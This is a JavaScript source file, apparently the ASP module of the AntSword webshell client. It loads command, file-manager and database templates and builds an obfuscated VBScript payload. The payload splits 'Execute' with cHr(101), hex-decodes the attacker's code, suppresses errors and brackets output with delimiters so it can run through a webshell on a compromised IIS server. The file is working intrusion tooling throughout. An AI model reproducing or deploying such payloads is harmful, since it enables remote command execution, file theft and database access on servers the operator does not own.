/**
 * ASP服务端脚本模板
 * 开写：2016/04/12
 * 更新：-
 * 作者：蚁逅 <https://github.com/antoor>
 */
'use strict';

// import Base from '../base';
const Base = require('../base');

class ASP extends Base {
  constructor(opts) {
    super(opts);
    // 解析模板
    [
      'base', 'command', 'filemanager',
      'database/dsn', 'database/mysql',
      'database/access', 'database/oracle',
      'database/sqlserver', 'database/sqloledb_1',
      'database/sqloledb_1_sspi', 'database/microsoft_jet_oledb_4_0'
    ].map((_) => {
      this.parseTemplate(`./asp/template/${_}`);
    });
    // 解析编码器
    this.encoders.map((_) => {
      this.parseEncoder(`./asp/encoder/${_}`);
    });
  }

  /**
   * 获取编码器列表
   * @return {array} 编码器列表
   */
  get encoders() {
    return [];
  }

  /**
   * HTTP请求数据组合函数
   * @param  {Object} data 通过模板解析后的代码对象
   * @return {Promise}     返回一个Promise操作对象
   */
  complete(data) {
    // 分隔符号
    let tag_s = '->|';
    let tag_e = '|<-';

    // let formatter = new this.format(this.__opts__['encode']);
    let formatter = Base.prototype.format(this.__opts__['encode']);

    // hex编码一次数据
    let hexCode = formatter['hex'](data['_']);

    // 组合完整的代码
    data['_'] = `eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""${tag_s}""""):Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""${hexCode}"""")):Response.Write(""""${tag_e}""""):Response.End"")")`;

    // 使用编码器进行处理并返回
    return this.encodeComplete(tag_s, tag_e, data);
  }
}

module.exports = ASP;
